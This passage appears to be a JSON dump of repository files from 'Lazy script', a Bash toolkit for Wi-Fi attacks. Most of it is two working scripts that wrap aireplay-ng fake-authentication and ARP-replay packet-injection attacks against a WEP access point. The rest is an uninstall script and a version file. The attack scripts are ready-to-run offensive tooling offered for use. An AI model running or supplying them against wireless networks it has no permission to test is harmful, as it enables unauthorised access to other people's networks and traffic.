          "content": "#! /bin/bash\n#############DEFAULTS###############\n#setting yellow-start \nYS=\"\\e[1;33m\"\n#setting color-end\nCE=\"\\e[0m\"\n#setting red-start\nRS=\"\\e[1;31m\"\n#setting frequent stings\nYNYES=\"(\"$YS\"y\"$CE\"/\"$YS\"n\"$CE\")(\"$YS\"Enter\"$CE\"=yes)\"\nYNNO=\"(\"$YS\"y\"$CE\"/\"$YS\"n\"$CE\")(\"$YS\"Enter\"$CE\"=no)\"\nYNONLY=\"(\"$YS\"y\"$CE\"/\"$YS\"n\"$CE\")\"\nPAKT=\"Press \"$YS\"any key$CE to\"\nPAKTC=\"Press \"$YS\"any key$CE to continue...\"\nPAKTGB=\"Press \"$YS\"any key$CE to go back...\"\n\n####################################\nprintf '\\033]2;FAKEAUTH\\a'\nWLANNM=$(cat /root/lscript/wlanmon.txt)\nexport WLANNM\necho -e \"Press \\e[1;33many key\\e[0m to start fake authentication...\"\nread\nwhile true\ndo\n\techo -e \"--------------------\"$RS\"Fake authentication\"$CE\"----------------------\"\n\tif [[ \"$FIRST\" = \"1\" ]]\n\tthen\n\t\taireplay-ng -1 0 -a $WEPB -h $MYMAC $WLANNM\n\telse\n\t\techo -e \"Getting you MAC....\"\n\t\tsleep 1\n\t\tMYMAC=$(ifconfig $WLANNM | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')\n\t\techo -e \"Your MAC is $MYMAC\"\n\t\tsleep 1\n\t\techo -e \"Starting fake-authentication...\"\n\t\tsleep 1\n\t\tFIRST=\"1\"\n\t\taireplay-ng -1 0 -a $WEPB -h $MYMAC $WLANNM\n\tfi\n\techo -e \"Re-fakeauth again?\"$YNYES\": \"\n\tread REF\n\tif [[ \"$REF\" = \"n\" ]]\n\tthen\n\t\texit\n\telse\n\t\tclear\n\t\tcontinue\n\tfi\ndone\n"
        },
        {
          "name": "lh43",
          "type": "blob",
          "size": 1.251953125,
          "content": "#! /bin/bash\n#############DEFAULTS###############\n#setting yellow-start \nYS=\"\\e[1;33m\"\n#setting color-end\nCE=\"\\e[0m\"\n#setting red-start\nRS=\"\\e[1;31m\"\n#setting frequent stings\nYNYES=\"(\"$YS\"y\"$CE\"/\"$YS\"n\"$CE\")(\"$YS\"Enter\"$CE\"=yes)\"\nYNNO=\"(\"$YS\"y\"$CE\"/\"$YS\"n\"$CE\")(\"$YS\"Enter\"$CE\"=no)\"\nYNONLY=\"(\"$YS\"y\"$CE\"/\"$YS\"n\"$CE\")\"\nPAKT=\"Press \"$YS\"any key$CE to\"\nPAKTC=\"Press \"$YS\"any key$CE to continue...\"\nPAKTGB=\"Press \"$YS\"any key$CE to go back...\"\n\n####################################\nprintf '\\033]2;PACKET INJECTION\\a'\nWLANNM=$(cat /root/lscript/wlanmon.txt)\nexport WLANNM\nwhile true\ndo\n\techo -e \"----------------------\"$RS\"Packet injection\"$CE\"-----------------------\"\n\techo -e \"You need to do the Fake-authentication first!(on the other terminal)\"\n\tif [[ \"$FIRSTT\" = \"1\" ]]\n\tthen\n\t\taireplay-ng -3 -b $WEPB -h $MYMAC $WLANNM\n\telse\n\t\techo -e \"$PAKT start fake authentication...\"\n\t\tread\n\t\techo -e \"Getting you MAC....\"\n\t\tsleep 1\n\t\tMYMAC=$(ifconfig $WLANNM | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')\n\t\techo -e \"Your MAC is $MYMAC\"\n\t\tsleep 1\n\t\techo -e \"Starting packet injection...\"\n\t\tsleep 1\n\t\tFIRSTT=\"1\"\n\t\taireplay-ng -3 -b $WEPB -h $MYMAC $WLANNM\n\tfi\n\techo -e \"Inject packets again?\"$YNYES\": \"\n\tread REF\n\tif [[ \"$REF\" = \"n\" ]]\n\tthen\n\t\texit\n\telse\n\t\tclear\n\t\tcontinue\n\tfi\ndone\n"
        },
        {
          "name": "ls",
          "type": "tree",
          "content": null
        },
        {
          "name": "uninstall.sh",
          "type": "blob",
          "size": 0.8251953125,
          "content": "#! /bin/bash\nfunction nounistall\n{\n\techo -e \"I knew you are still lazy :D :D \"\n\tsleep 2\n\techo -e \"If you want any feature to be added, contact me on FB\"\n\tsleep 2\n\techo -e \" \"\n\techo -e \"Aris\"\n\tsleep 1\n\texit\n}\necho -e \"Do you really want to uninstall the Lazy script from your system?(y/n)(Enter=no): \"\nread CHUN\nif [ \"$CHUN\" = \"y\" ]\nthen\n\techo -e \"If you have any problems please contact me first.\"\n\techo -e \"Do you still wanna get rid of me?(y/n)(Enter=no): \"\n\tread CHCHUN\n\tif [ \"$CHCHUN\" = \"y\" ]\n\tthen\n\t\techo -e \"Ok, uninstalling everything that has to do with lscript on your system\"\n\t\tsleep 4\n\t\trm -r /bin/lscript\n\t\techo -e \"Done.\"\n\t\tsleep 1\n\t\techo -e \"You need to manually delete the lscript folder from your /root/ directory though...\"\n\t\tsleep 2\n\t\techo -e \"Press any key to exit...\"\n\t\tread\n\t\texit\n\telse\n\t\tnounistall\n\tfi\nelse\n\tnounistall\nfi\n"
        },
        {
          "name": "version.txt",
          "type": "blob",
          "size": 0.005859375,
          "content": "2.1.5\n"
        }
      ]
    }
  ]
}